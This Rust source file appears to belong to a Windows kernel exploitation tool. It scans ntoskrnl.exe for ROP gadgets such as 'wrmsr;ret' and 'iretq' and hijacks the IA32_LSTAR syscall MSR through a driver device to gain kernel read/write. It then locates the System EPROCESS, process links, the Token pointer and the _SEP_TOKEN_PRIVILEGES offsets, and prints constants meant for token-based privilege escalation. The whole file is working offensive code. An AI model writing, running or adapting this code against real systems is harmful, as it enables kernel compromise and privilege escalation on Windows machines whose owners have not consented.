use anyhow::{Context, Result};

use crate::device::{msr_read, Device, MSR_LSTAR};
use crate::eprocess::{resolve_system_eprocess, EPROC_ACTIVE_LINKS, EPROC_TOKEN, EPROC_UNIQUE_PID};
use crate::gadgets::{scan_gadgets_in_pe, Gadgets};
use crate::kernel_rw::KernelRW;
use crate::commands::kread::open_krw;
use crate::utils::{
    find_cr3_for_va, find_export_va, find_mod, get_kernel_modules, ntoskrnl_disk_path, KernelMod,
};

pub fn cmd_scan_gadgets(mods: &[KernelMod], runtime_base: u64) -> Result<Gadgets> {
    let path = ntoskrnl_disk_path(mods)?;
    println!("[*] reading {} from disk...", path);
    let pe_bytes = std::fs::read(&path)
        .with_context(|| format!("cannot read {}", path))?;
    println!("  [i] {} bytes read, scanning executable sections", pe_bytes.len());

    let gadgets = scan_gadgets_in_pe(&pe_bytes, runtime_base)?;

    println!("[*] gadget scan results:");
    macro_rules! print_gadget {
        ($field:expr, $label:literal) => {
            match $field {
                Some(va) => println!("  [+] {:20} 0x{:016X}", $label, va),
                None     => println!("  [!] {:20} NOT FOUND", $label),
            }
        };
    }
    print_gadget!(gadgets.write_mem, "mov [rdx],rax;ret");
    match gadgets.read_mem {
        Some((va, reg)) => println!("  [+] {:20} 0x{:016X}", format!("mov rax,[{:?}];ret", reg).to_lowercase(), va),
        None            => println!("  [!] {:20} NOT FOUND", "mov rax,[reg];ret"),
    }
    print_gadget!(gadgets.pop_rcx,   "pop rcx;ret");
    print_gadget!(gadgets.pop_rax,   "pop rax;ret");
    print_gadget!(gadgets.pop_rdx,   "pop rdx;ret");
    print_gadget!(gadgets.wrmsr_ret, "wrmsr;ret");
    print_gadget!(gadgets.iretq,     "iretq");

    if gadgets.all_found() {
        println!("[+] all gadgets found");
    } else {
        println!("[!] one or more gadgets missing");
    }

    Ok(gadgets)
}

pub fn cmd_lookup_export(dev: &Device, symbol: &str) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let va = find_export_va(&pe, nt.va, symbol)?;
    println!("[+] {} VA=0x{:016X}", symbol, va);
    Ok(())
}

pub fn cmd_eprocess(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    let path = ntoskrnl_disk_path(&mods)?;
    let pe = std::fs::read(&path).with_context(|| format!("cannot read {}", path))?;
    let ps_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    println!("[+] PsInitialSystemProcess VA=0x{:016X}", ps_va);
    let krw = KernelRW::setup(dev, &pe, nt.va)?;
    let eproc = krw.kread(ps_va)?;
    println!("[+] System EPROCESS=0x{:016X}", eproc);
    Ok(())
}

pub fn cmd_procid(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let pid = krw.kread(eproc + EPROC_UNIQUE_PID)?;
    println!("[+] UniqueProcessId (+0x{:X}) = {}", EPROC_UNIQUE_PID, pid);
    Ok(())
}

pub fn cmd_proclinks(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let flink = krw.kread(eproc + EPROC_ACTIVE_LINKS)?;
    let blink = krw.kread(eproc + EPROC_ACTIVE_LINKS + 8)?;
    println!("[+] ActiveProcessLinks (+0x{:X}):", EPROC_ACTIVE_LINKS);
    println!("    Flink = 0x{:016X}  (EPROCESS 0x{:016X})", flink, flink.wrapping_sub(EPROC_ACTIVE_LINKS));
    println!("    Blink = 0x{:016X}  (EPROCESS 0x{:016X})", blink, blink.wrapping_sub(EPROC_ACTIVE_LINKS));
    Ok(())
}

pub fn cmd_token(dev: &Device) -> Result<()> {
    let (krw, eproc) = resolve_system_eprocess(dev)?;
    let token_ref = krw.kread(eproc + EPROC_TOKEN)?;
    let token = token_ref & !0xF;
    println!("[+] Token (+0x{:X}):", EPROC_TOKEN);
    println!("    EX_FAST_REF = 0x{:016X}  (ptr = 0x{:016X})", token_ref, token);
    Ok(())
}

pub fn cmd_find_kbase(dev: &Device) -> Result<()> {
    let mods = get_kernel_modules()?;
    let nt = crate::utils::resolve_ntoskrnl(dev, &mods)?;
    println!("[+] ntoskrnl VA=0x{:016X}", nt.va);
    println!("  [i] size=0x{:X}", nt.size);

    let lstar = match msr_read(dev, MSR_LSTAR) {
        Ok(v) => { println!("[+] IA32_LSTAR=0x{:016X}", v); v }
        Err(e) => { println!("[~] RDMSR LSTAR failed: {}", e); 0 }
    };
    if lstar == 0 {
        println!("[!] cannot validate CR3 without LSTAR");
        return Ok(());
    }

    match find_cr3_for_va(dev, nt.va, nt.size, lstar) {
        Some((cr3, nt_pa)) => {
            println!("[+] CR3=0x{:X}", cr3);
            println!("[+] ntoskrnl PA=0x{:X}", nt_pa);
        }
        None => {
            return Ok(());
        }
    }

    Ok(())
}

fn is_kernel_ptr(v: u64) -> bool {
    v >= 0xFFFF_8000_0000_0000
}

fn looks_like_sep_privilege(x: u64) -> bool {
    x == u64::MAX || (x & 0xFFFF_FFFF_0000_0000) != 0
}

/// Validate ActiveProcessLinks at `links_off`: bidirectional list check + next PID.
fn validate_process_links(
    krw: &KernelRW<'_>,
    eproc: u64,
    links_off: u64,
    pid_off: u64,
) -> Option<(u64, u64)> {
    let flink = krw.kread(eproc + links_off).ok()?;
    let blink = krw.kread(eproc + links_off + 8).ok()?;
    if !is_kernel_ptr(flink) || !is_kernel_ptr(blink) {
        return None;
    }

    let next = flink.wrapping_sub(links_off);
    if !is_kernel_ptr(next) {
        return None;
    }

    let back = krw.kread(next + links_off + 8).ok()?;
    if back != eproc + links_off {
        return None;
    }

    let next_pid = krw.kread(next + pid_off).ok()?;
    if next_pid == 4 || next_pid == 0 || next_pid > 0xFFFF_FFFF {
        return None;
    }

    Some((next, next_pid))
}

struct TokenDiscovery {
    eproc_off: u64,
    sep_present: u64,
    sep_enabled: u64,
    score: i32,
}

fn find_sep_in_token(krw: &KernelRW<'_>, token: u64) -> Option<(u64, u64, i32)> {
    let mut tok_window: Vec<u64> = Vec::new();
    for j in 0..32u64 {
        tok_window.push(krw.kread(token + j * 8).ok()?);
    }

    let mut best: Option<(u64, u64, i32)> = None;
    for j in 0..tok_window.len().saturating_sub(1) {
        let v0 = tok_window[j];
        let v1 = tok_window[j + 1];
        if !looks_like_sep_privilege(v0) || !looks_like_sep_privilege(v1) {
            continue;
        }

        let off0 = j as u64 * 8;
        let off1 = off0 + 8;
        let mut score = 0;
        if v0 == u64::MAX && v1 == u64::MAX {
            score += 200;
        }
        if (0x30..=0x80).contains(&off0) {
            score += 100;
        }
        if off0 == 0x40 {
            score += 50;
        }

        if best.as_ref().is_none_or(|(_, _, s)| score > *s) {
            best = Some((off0, off1, score));
        }
    }

    best
}

fn read_eproc_image_name(eproc_bytes: &[u8], img_off: u64) -> Option<String> {
    let start = img_off as usize;
    let end = start.checked_add(15)?;
    if end > eproc_bytes.len() {
        return None;
    }
    let slice = &eproc_bytes[start..end];
    let nul = slice.iter().position(|&b| b == 0).unwrap_or(slice.len());
    if nul == 0 {
        return None;
    }
    Some(String::from_utf8_lossy(&slice[..nul]).to_string())
}

fn validate_eprocess_walk(
    krw: &KernelRW<'_>,
    start: u64,
    links_off: u64,
    pid_off: u64,
    img_off: u64,
    eproc_bytes: &[u8],
    steps: usize,
) -> (usize, Vec<(u64, u64, String)>) {
    let mut seen = Vec::new();
    let mut current = start;

    for _ in 0..steps {
        let pid = match krw.kread(current + pid_off) {
            Ok(v) => v,
            Err(_) => break,
        };
        let name = if current == start {
            read_eproc_image_name(eproc_bytes, img_off).unwrap_or_default()
        } else {
            let lo = krw.kread(current + img_off).unwrap_or(0);
            let hi = krw.kread(current + img_off + 8).unwrap_or(0);
            let mut bytes = [0u8; 15];
            bytes[0..8].copy_from_slice(&lo.to_le_bytes());
            bytes[8..15].copy_from_slice(&hi.to_le_bytes()[0..7]);
            let nul = bytes.iter().position(|&b| b == 0).unwrap_or(15);
            String::from_utf8_lossy(&bytes[..nul]).to_string()
        };
        seen.push((current, pid, name));

        let flink = match krw.kread(current + links_off) {
            Ok(v) => v,
            Err(_) => break,
        };
        current = flink.wrapping_sub(links_off);
        if current == start {
            break;
        }
    }

    (seen.len(), seen)
}

/// Discover the EPROCESS and _SEP_TOKEN_PRIVILEGES offsets for the running kernel.
/// This performs a one-time KernelRW setup (LSTAR hijack + gadget scan from the
/// on-disk ntoskrnl.exe), then hunts for the well-known markers from the System
/// EPROCESS:
///   - UniqueProcessId == 4 (System PID)
///   - ImageFileName containing "System"
///   - ActiveProcessLinks (bidirectional list + walk validation)
///   - Token pointer, followed by reading the _TOKEN area looking for the
///     distinctive high-privilege bits in _SEP_TOKEN_PRIVILEGES (Present/Enabled).
///
/// The printed constants can be pasted directly into eprocess.rs.
pub fn cmd_discover_offsets(dev: &Device) -> Result<()> {
    println!();
    println!("[*] Hijacking LSTAR...");
    let (krw, pe, nt) = open_krw(dev)?;

    let build = match find_export_va(&pe, nt.va, "NtBuildNumber") {
        Ok(va) => match krw.kread(va) {
            Ok(v) => {
                let raw = v as u32;
                let b = raw & 0xFFFF;
                println!("[+] NtBuildNumber = {} (ULONG 0x{:08X})", b, raw);
                Some(b as u64)
            }
            Err(_) => None,
        },
        Err(_) => None,
    };

    let ps_init_va = find_export_va(&pe, nt.va, "PsInitialSystemProcess")?;
    println!("[+] PsInitialSystemProcess VA=0x{:016X}", ps_init_va);
    let system_eproc = krw.kread(ps_init_va)?;
    if system_eproc < 0xFFFF_8000_0000_0000 {
        anyhow::bail!("PsInitialSystemProcess kread gave bad value 0x{:016X}", system_eproc);
    }
    println!("[+] System EPROCESS = 0x{:016X}", system_eproc);

    const WINDOW_BYTES: usize = 0x600;
    let mut eproc_mem: Vec<u64> = Vec::new();
    for i in 0..(WINDOW_BYTES / 8) {
        eproc_mem.push(krw.kread(system_eproc + (i * 8) as u64)?);
    }

    let mut eproc_bytes: Vec<u8> = Vec::with_capacity(WINDOW_BYTES);
    for &q in &eproc_mem {
        eproc_bytes.extend_from_slice(&q.to_le_bytes());
    }

    let mut img_off: Option<u64> = None;
    let needle = b"System";
    for i in 0..eproc_bytes.len().saturating_sub(needle.len()) {
        if &eproc_bytes[i..i + needle.len()] == needle {
            img_off = Some(i as u64);
            println!("[+] Found \"System\" at EPROCESS +0x{:X}", i);
            break;
        }
    }

    let pid_candidates: Vec<u64> = eproc_mem
        .iter()
        .enumerate()
        .filter(|(_, v)| **v == 4)
        .map(|(i, _)| (i * 8) as u64)
        .collect();

    let mut pid_off: Option<u64> = None;
    let mut links_off: Option<u64> = None;

    for &po in &pid_candidates {
        let lo = po + 8;
        if let Some((next, next_pid)) = validate_process_links(&krw, system_eproc, lo, po) {
            pid_off = Some(po);
            links_off = Some(lo);
            println!("[+] UniqueProcessId at EPROCESS +0x{:X}", po);
            println!(
                "[+] ActiveProcessLinks at EPROCESS +0x{:X} (Next PID: {})",
                lo, next_pid
            );
            println!("    next EPROCESS = 0x{:016X}", next);
            break;
        }
    }

    // Fallback: scan all flink/blink pairs with full bidirectional validation.
    if links_off.is_none() {
        println!("[*] PID+links pair not found; scanning all list candidates...");
        for i in 0..eproc_mem.len().saturating_sub(1) {
            let lo = (i * 8) as u64;
            let po = lo.saturating_sub(8);
            if po > 0x500 {
                continue;
            }
            if eproc_mem.get((po / 8) as usize).copied() != Some(4) {
                continue;
            }
            if let Some((next, next_pid)) = validate_process_links(&krw, system_eproc, lo, po) {
                pid_off = Some(po);
                links_off = Some(lo);
                println!("[+] UniqueProcessId at EPROCESS +0x{:X}", po);
                println!(
                    "[+] ActiveProcessLinks at EPROCESS +0x{:X} (validated: next PID {})",
                    lo, next_pid
                );
                println!("    next EPROCESS = 0x{:016X}", next);
                break;
            }
        }
    }

    // --- Token + _SEP_TOKEN_PRIVILEGES ---
    let search_lo = links_off.map(|l| l + 0x10).unwrap_or(0x100);
    let search_hi = img_off.map(|i| i.saturating_sub(8)).unwrap_or(0x500);
    let mut token_pick: Option<TokenDiscovery> = None;

    println!(
        "[*] Searching for Token in EPROCESS +0x{:X}..+0x{:X}",
        search_lo, search_hi
    );

    let mut i = (search_lo / 8) as usize;
    let end = ((search_hi / 8) as usize).min(eproc_mem.len());
    while i < end {
        let eproc_off = (i * 8) as u64;
        let val = eproc_mem[i];
        let tok = val & !0xF;
        if is_kernel_ptr(tok) {
            if let Some((sep_present, sep_enabled, sep_score)) = find_sep_in_token(&krw, tok) {
                let mut score = sep_score;
                if eproc_off > links_off.unwrap_or(0) {
                    score += 20;
                }
                if img_off.is_some_and(|img| eproc_off < img) {
                    score += 20;
                }
                if (val & 0xF) <= 0xF {
                    score += 10;
                }

                let pick = TokenDiscovery {
                    eproc_off,
                    sep_present,
                    sep_enabled,
                    score,
                };
                if token_pick.as_ref().is_none_or(|p| pick.score > p.score) {
                    token_pick = Some(pick);
                }
            }
        }
        i += 1;
    }

    let (token_off, sep_present, sep_enabled) = if let Some(p) = token_pick {
        println!(
            "[+] Token at EPROCESS +0x{:X}, _SEP_TOKEN_PRIVILEGES at token+0x{:X}/+0x{:X}",
            p.eproc_off, p.sep_present, p.sep_enabled
        );
        (Some(p.eproc_off), Some(p.sep_present), Some(p.sep_enabled))
    } else {
        println!("[!] Token + SEP offsets not found in search window");
        (None, None, None)
    };

    println!();
    println!("   ===== Discovered Offsets ======");
    if let Some(b) = build {
        println!("   NtBuildNumber = {} (0x{:X})", b, b);
        println!();
    }

    let pid_val = pid_off.unwrap_or(0x1D0);
    let links_val = links_off.unwrap_or(pid_val + 8);
    let token_val = token_off.unwrap_or(0x248);
    let img_val = img_off.unwrap_or(0x338);
    let sep_p_val = sep_present.unwrap_or(0x40);
    let sep_e_val = sep_enabled.unwrap_or(0x48);

    println!("pub const EPROC_UNIQUE_PID:     u64 = 0x{:X};", pid_val);
    println!("pub const EPROC_ACTIVE_LINKS:   u64 = 0x{:X};", links_val);
    println!("pub const EPROC_TOKEN:          u64 = 0x{:X};", token_val);
    println!("pub const EPROC_IMAGE_FILENAME: u64 = 0x{:X};", img_val);
    println!();
    println!("pub const TOKEN_SEP_PRESENT:    u64 = 0x{:X};", sep_p_val);
    println!("pub const TOKEN_SEP_ENABLED:    u64 = 0x{:X};", sep_e_val);
    println!();

    // --- Validation walk ---
    let mut validated = false;
    if let (Some(lo), Some(po), Some(io)) = (links_off, pid_off, img_off) {
        let (count, entries) =
            validate_eprocess_walk(&krw, system_eproc, lo, po, io, &eproc_bytes, 6);
        if count >= 2 {
            println!("[+] Validation walk ({} processes):", count);
            for (addr, pid, name) in &entries {
                println!("    EPROCESS 0x{:016X}  PID {:>6}  {}", addr, pid, name);
            }
            let first_ok = entries.first().is_some_and(|(_, pid, name)| *pid == 4 && name == "System");
            let others_ok = entries.iter().skip(1).all(|(_, pid, _)| *pid != 4);
            validated = first_ok && others_ok;
            if validated {
                println!("[+] Validation PASSED");
                println!();
            } else {
                println!("[!] Validation FAILED");
                println!();
            }
        } else {
            println!("[!] Could not walk the process list");
            println!();
        }
    } else {
        println!("[!] Missing PID, links, or ImageFileName offset");
        println!();
    }

    Ok(())
}
